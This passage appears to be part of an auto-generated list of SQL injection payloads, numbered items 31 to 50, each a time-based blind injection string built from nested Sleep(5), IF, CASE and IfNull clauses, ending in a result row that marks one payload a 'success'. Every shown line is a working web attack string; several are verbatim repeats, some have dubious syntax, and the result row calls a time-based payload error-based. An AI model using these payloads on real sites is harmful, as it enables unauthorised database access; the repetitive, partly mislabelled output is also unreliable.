+31: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (SELECT IFNULL(Sleep(5),0)) ELSE 0 END) --`
+32: `' OR 1=IF((Select Sleep(5)),1,0) AND IfNull(Sleep(5),0) --`
+33: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (SELECT IfNull(Sleep(5),0)) ELSE 0 END) --`
+34: `' OR 1=IF((Select Sleep(5)),1,0) AND (IfNull(Select Sleep(5),0)) --`
+35: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (IfNull(Select Sleep(5),0)) ELSE 0 END) --`
+36: `' OR 1=IF((SELECT Sleep(5)),1,0) AND IfNull(IfNull(Select Sleep(5),0),0) --`
+37: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (IfNull(IfNull(Select Sleep(5),0),0)) ELSE 0 END) --`
+38: `' OR 1=IF((SELECT IfNull(Sleep(5),0)),1,0) AND IfNull((SELECT Sleep(5)),0) --`
+39: `' OR 1=(CASE WHEN IF((SELECT IfNull(Sleep(5),0)),1,0)=1 THEN (IfNull((SELECT Sleep(5)),0)) ELSE 0 END) --`
+40: `' OR 1=IF((SELECT IfNull(Sleep(5),0)),1,0) AND IfNull((SELECT IfNull(Sleep(5),0)),0) --`
+41: `' OR 1=(CASE WHEN IF((SELECT IfNull(Sleep(5),0)),1,0)=1 THEN (IfNull((SELECT IfNull(Sleep(5),0)),0)) ELSE 0 END) --`
+42: `' OR 1=IF((Select IfNull(Sleep(5),0)),1,0) AND IfNull(IfNull(Select Sleep(5),0),0) --`
+43: `' OR 1=(CASE WHEN IF(Select IfNull(Sleep(5),0),1,0)=1 THEN (IfNull(IfNull(Select Sleep(5),0),0)) ELSE 0 END) --`
+44: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(Sleep(5),0),0) --`
+45: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(Sleep(5),0),0)) ELSE 0 END) --`
+46: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`
+47: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(IfNull(Sleep(5),0),0),0)) ELSE 0 END) --`
+48: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`
+49: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(IfNull(Sleep(5),0),0),0)) ELSE 0 END) --`
+50: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`",1: ' OR 1=1 AND Sleep(5) --,Success(S): Payload successfully showed Error-based SQL injection.,298.74,0.03
